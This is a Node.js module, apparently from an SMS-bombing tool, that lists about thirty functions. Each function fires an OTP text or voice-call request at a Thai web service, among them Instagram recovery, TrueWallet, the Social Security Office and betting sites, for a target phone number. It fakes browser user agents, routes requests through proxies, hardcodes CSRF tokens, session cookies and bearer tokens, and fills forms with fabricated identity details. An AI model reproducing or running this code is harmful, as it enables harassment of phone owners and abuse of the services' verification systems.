// language: JavaScript, file: lib/otpProviders.js, target: Node 18+
// 31 provider — proxy ดึงจาก proxy.txt อัตโนมัติผ่าน fetchJson
const { fetchJson } = require('./httpClient');

const UA_ANDROID = 'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36';
const UA_WIN = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36';

const okStatus = r => r.status === 200 || r.status === 201 || r.status === 204;
const strip0 = p => String(p).replace(/^0/, '');

const providers = {
  async jobbkk(phone) {
    const r = await fetchJson('https://api.jobbkk.com/v1/easy/otp_code', {
      method: 'POST',
      headers: { 'user-agent': UA_ANDROID, 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8' },
      body: 'mobile=' + encodeURIComponent(phone),
    });
    return okStatus(r);
  },
  async theconcert(phone) {
    const r = await fetchJson('https://www.theconcert.com/rest/request-otp', {
      method: 'POST',
      headers: {
        'x-xsrf-token': '33ed88f53546803c779ff8c10e7386057YuSCY/kUuCibrt0phirk+ftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc+UMKSLdUFEtf7U4rRzuy2rvmK+LFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA',
        'x-csrf-token': 'ai49Zub4-IsdrbJwOTXdL5bZy1RU2QvpHSPc',
        'user-agent': UA_ANDROID,
      },
      json: { mobile: phone, country_code: 'TH', lang: 'th', channel: 'sms', digit: 4 },
    });
    return okStatus(r);
  },
  async carsome(phone) {
    const r = await fetchJson('https://www.carsome.co.th/website/login/sendSMS', {
      method: 'POST',
      headers: { 'user-agent': UA_ANDROID },
      json: { username: phone, optType: 0 },
    });
    return okStatus(r);
  },
  async nocnoc(phone) {
    const p = strip0(phone);
    const url = `https://nocnoc.com/authentication-service/user/OTP/verify-phone/%2B66${p}?lang=th&userType=BUYER&locale=th&orgIdfier=scg&phone=%2B66${p}&phoneCountryCode=%2B66&b-uid=1.0.760`;
    const r = await fetchJson(url, {
      headers: { 'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwiYWxnIjoiZGlyIn0..MSrqMX5S5Ui8NbGvEih2uw.NCJuqSPHzIwZ0Jy4Snq25pKUa887meHakzTe3YTCUnVsMwY8cQMnJ-nOr6Lbb5irc2gr8VfD0G2ZYocg22oVH36DdBnfoJirezzLuf9Uc2DiaQHLJ8OJY3UHo8fLUMB7BYe2w0Q5fDdMF1N0u8_aGA.ZNn49ubbJXSlycijnTncbQ' },
    });
    return okStatus(r);
  },
  async instagram(phone) {
    const csrf = process.env.IG_CSRF || '';
    if (!csrf) return false;
    const r = await fetchJson('https://www.instagram.com/accounts/account_recovery_send_ajax/', {
      method: 'POST',
      headers: {
        'content-type': 'application/x-www-form-urlencoded',
        'x-requested-with': 'XMLHttpRequest',
        'user-agent': UA_WIN,
        'x-csrftoken': csrf,
      },
      body: `email_or_username=66${strip0(phone)}&recaptcha_challenge_field=`,
    });
    return okStatus(r);
  },
  async freshket(phone) {
    const r = await fetchJson('https://api.freshket.co/baseApi/Users/RequestOtp', {
      method: 'POST',
      headers: { 'user-agent': UA_ANDROID, 'content-type': 'application/json;charset=UTF-8' },
      json: { isDev: 'false', language: 'th', phone: `+66${strip0(phone)}` },
    });
    return okStatus(r);
  },
  async trueShopping(phone) {
    const r = await fetchJson('https://api.true-shopping.com/customer/api/request-activate/mobile_no', {
      method: 'POST',
      body: { username: phone },
    });
    return okStatus(r);
  },
  async hdmall(phone) {
    const r = await fetchJson(`https://hdmall.co.th/phone_verifications?express_sign_in=1&mobile=${encodeURIComponent(phone)}`);
    return okStatus(r);
  },
  async lotuss(phone) {
    const r = await fetchJson('https://api-customer.lotuss.com/clubcard-bff/v1/customers/otp', {
      method: 'POST',
      body: { mobile_phone_no: phone },
    });
    return okStatus(r);
  },
  async joox(phone) {
    const url = `https://api.joox.com/web-fcgi-bin/web_account_manager?optype=5&os_type=2&country_code=66&phone_number=0${phone}&time=${Date.now()}&_=${Date.now()}&callback=axiosJsonpCallback2`;
    const r = await fetchJson(url);
    return okStatus(r);
  },
  async mtsblockchain(phone) {
    const r = await fetchJson('https://www.mtsblockchain.com/mgb-api/user/register/reqotp', {
      method: 'POST',
      headers: { 'content-type': 'application/json', 'user-agent': UA_WIN },
      json: { mobile: phone },
    });
    return okStatus(r);
  },
  async makroclick(phone) {
    const r = await fetchJson('https://ocs-prod-api.makroclick.com/next-ocs-member/user/register', {
      method: 'POST',
      json: { username: phone, password: '6302814184624az', name: '0903281894',
        provinceCode: '28', districtCode: '393', subdistrictCode: '3494', zipcode: '40260',
        siebelCustomerTypeId: '710', acceptTermAndCondition: 'true', hasSeenConsent: 'false', locale: 'th_TH' },
    });
    return okStatus(r);
  },
  async youpik(phone) {
    const r = await fetchJson('https://api.ulive.youpik.com/api-base/sms/sendCode', {
      method: 'POST',
      headers: {
        'authorization': 'Basic d2ViQXBwOndlYkFwcA==',
        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
        'user-agent': UA_ANDROID,
      },
      body: `phone=${strip0(phone)}&type=1`,
    });
    return okStatus(r);
  },
  async truewallet(phone) {
    const r = await fetchJson('https://pygw.csne.co.th/api/gateway/truewalletRequestOtp', {
      method: 'POST',
      headers: {
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'user-agent': UA_ANDROID,
        'cookie': 'pygw_csne_coth=91207b7404b2c71edd9db8c43c6d18c23949f5ea',
      },
      body: `transactionId=b05a66a7e9d0930cbda4d78b351ea6f7&phone=${phone}`,
    });
    return okStatus(r);
  },
  async trueidVacc(phone) {
    const r = await fetchJson('https://vaccine.trueid.net/vacc-verify/api/getotp', {
      method: 'POST',
      headers: { 'user-agent': UA_ANDROID, 'content-type': 'application/json;charset=UTF-8', 'accept': 'application/json, text/plain, */*' },
      json: { msisdn: phone, function: 'enroll' },
    });
    return okStatus(r);
  },
  async aisplay(phone) {
    const landing = await fetchJson('https://srfng.ais.co.th/Lt6YyRR2Vvz%2B%2F6MNG9xQvVTU0rmMQ5snCwKRaK6rpTruhM%2BDAzuhRQ%3D%3D?redirect_uri=https%3A%2F%2Faisplay.ais.co.th%2Fportal%2Fcallback%2Ffungus%2Fany&httpGenerate=generated', { headers: { 'user-agent': UA_ANDROID } });
    const html = await landing.text();
    const m = html.match(/<input type="hidden" id='token' value="(.*)">/);
    if (!m) return false;
    const r = await fetchJson('https://srfng.ais.co.th/login/sendOneTimePW', {
      method: 'POST',
      headers: { 'user-agent': UA_ANDROID, 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'authorization': `Bearer ${m[1]}` },
      body: `msisdn=66${strip0(phone)}&serviceId=AISPlay&accountType=all&otpChannel=sms`,
    });
    return okStatus(r);
  },
  async kaitorasap(phone) {
    const r = await fetchJson('https://www.kaitorasap.co.th/api/index.php/send-otp-login/', {
      method: 'POST',
      headers: { 'accept': 'application/json, text/javascript, */*; q=0.01', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'x-requested-with': 'XMLHttpRequest', 'user-agent': UA_ANDROID },
      body: `phone_number=${phone}&lag=`,
    });
    return okStatus(r);
  },
  async konvy(phone) {
    const r = await fetchJson(`https://www.konvy.com/ajax/system.php?type=reg&action=get_phone_code&phone=${phone}`, {
      headers: { 'accept': 'application/json, text/javascript, */*; q=0.01', 'x-requested-with': 'XMLHttpRequest', 'user-agent': UA_ANDROID },
    });
    return okStatus(r);
  },
  async shop1112(phone) {
    const r = await fetchJson('https://api2.1112.com/api/v1/otp/create', {
      method: 'POST',
      headers: { 'content-type': 'application/json;charset=UTF-8', 'user-agent': UA_ANDROID },
      json: { phonenumber: phone, language: 'th' },
    });
    return okStatus(r);
  },
  async msport1688(phone) {
    const r = await fetchJson('https://www.msport1688.com/auth/otp_sender', {
      method: 'POST',
      headers: { 'content-type': 'application/x-www-form-urlencoded', 'user-agent': UA_ANDROID },
      body: `phone=${phone}&otp=&password=&bank=&bank_number=&full_name=&ref=`,
    });
    return okStatus(r);
  },
  async ep789bet(phone) {
    const r = await fetchJson('https://ep789bet.net/auth/send_otp', {
      method: 'POST',
      headers: { 'content-type': 'application/x-www-form-urlencoded', 'user-agent': UA_ANDROID },
      body: `phone=${phone}&otp=&password=&bank=&bank_number=&full_name=&ref=`,
    });
    return okStatus(r);
  },
  async theconcertCall(phone) {
    const r = await fetchJson('https://www.theconcert.com/rest/request-otp', {
      method: 'POST',
      headers: {
        'content-type': 'application/json;charset=UTF-8', 'accept': 'application/json, text/plain, */*',
        'user-agent': UA_ANDROID, 'x-requested-with': 'XMLHttpRequest',
        'x-csrf-token': 'd6VfYNo3-RJK5IK0axoCE7KLIAPbW9K0IbL8',
        'x-xsrf-token': 'b2b9a4f732d05668c61e64f836417f67/iS0TaMFdXciRQYns4jNXpeVYy3DlvGY6ML+q8oquXvseUvcnIelmUwwR9/wJHKHjGKfN0+WS9orN1zdtt4J3I72qJ3x4Va07eBC0isPMu4ktiZw5DvLcobqJ9l39rFP',
      },
      json: { mobile: phone, country_code: 'TH', lang: 'th', channel: 'call', digit: 4 },
    });
    return okStatus(r);
  },
  async jdbaa(phone) {
    const r = await fetchJson('https://www.jdbaa.com/api/otp-not-captcha', {
      method: 'POST',
      headers: { 'content-type': 'application/json; charset=UTF-8', 'user-agent': UA_ANDROID },
      json: { phone_number: phone, user_id: `ak${phone}` },
    });
    return okStatus(r);
  },
  async makroclick2(phone) {
    const r = await fetchJson('https://ocs-prod-api.makroclick.com/next-ocs-member/user/register', {
      method: 'POST',
      json: { username: phone, password: '6302814184624az', name: '0903281894',
        provinceCode: '28', districtCode: '393', subdistrictCode: '3494', zipcode: '40260',
        siebelCustomerTypeId: '710', acceptTermAndCondition: 'true', hasSeenConsent: 'false', locale: 'th_TH' },
    });
    return okStatus(r);
  },
  async sso(phone) {
    const r = await fetchJson('https://www.sso.go.th/wpr/MEM/terminal/ajax_send_otp', {
      method: 'POST',
      headers: { 'user-agent': 'Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'x-requested-with': 'XMLHttpRequest' },
      body: `dCard=1358231116147&Mobile=${phone}&password=098098Az&repassword=098098Az&perPrefix=Mr.&cn=Dhdhhs&sn=Vssbsh&perBirthday=5&perBirthmonth=5&perBirthyear=2545&Email=nickytom5879%40gmail.com&otp_type=OTP&otpvalue=&messageId=REGISTER`,
    });
    return okStatus(r);
  },
  async tgfone(phone) {
    const r = await fetchJson('https://www.tgfone.com/signin/verifylforgot', {
      method: 'POST',
      headers: { 'user-agent': UA_ANDROID, 'content-type': 'application/x-www-form-urlencoded' },
      body: `forgot_name=${phone}`,
    });
    return okStatus(r);
  },
  async khonde(phone) {
    const landing = await fetchJson('https://app.khonde.com/register', { headers: { 'user-agent': UA_ANDROID } });
    const html = await landing.text();
    const m = html.match(/<meta[^>]+name="csrf-token"[^>]+content="([^"]+)"/);
    if (!m) return false;
    const r = await fetchJson(`https://app.khonde.com/requestOTP/${phone}`, {
      headers: { 'x-xsrf-token': m[1], 'user-agent': UA_ANDROID },
    });
    return okStatus(r);
  },
  async dtacGaming(phone) {
    const r = await fetchJson('https://gamingnation.dtac.co.th/api/otp/request', {
      method: 'POST',
      headers: { 'user-agent': UA_ANDROID },
      json: { template: 'register', phone_no: phone },
    });
    return okStatus(r);
  },
  async ch3plus(phone) {
    const r = await fetchJson('https://api-sso.ch3plus.com/user/request-otp', {
      method: 'POST',
      headers: { 'user-agent': UA_ANDROID },
      json: { tel: phone, type: 'login' },
    });
    return okStatus(r);
  },
  async cmtrade(phone) {
    const r = await fetchJson('https://api.cmtrade.com/api/v2/account/sms/code', {
      method: 'POST',
      headers: { 'user-agent': UA_WIN, 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'accept': 'application/json, text/javascript, */*; q=0.01' },
      body: `phone=${phone}&countryCode=66&countryId=Thailand&type=mobile`,
    });
    return okStatus(r);
  },
  async bigthailand(phone) {
    const landing = await fetchJson('https://www.bigthailand.com/login', { headers: { 'user-agent': UA_ANDROID } });
    const html = await landing.text();
    const m = html.match(/name="auth\._token\.local"[^>]*value="([^"]+)"/);
    if (!m) return false;
    const r = await fetchJson('https://www.bigthailand.com/authentication-service/user/OTP', {
      method: 'POST',
      headers: { 'user-agent': UA_ANDROID, 'authorization': `Bearer ${m[1]}`, 'content-type': 'application/json;charset=UTF-8' },
      json: { locale: 'th', phone: `+66${strip0(phone)}`, email: 'asjfgyfg2@hbsfsdf.sdf',
        userParams: { buyerName: 'sfiushjud fusdhfus', activateLink: 'www.google.com' } },
    });
    return okStatus(r);
  },
};

module.exports = providers;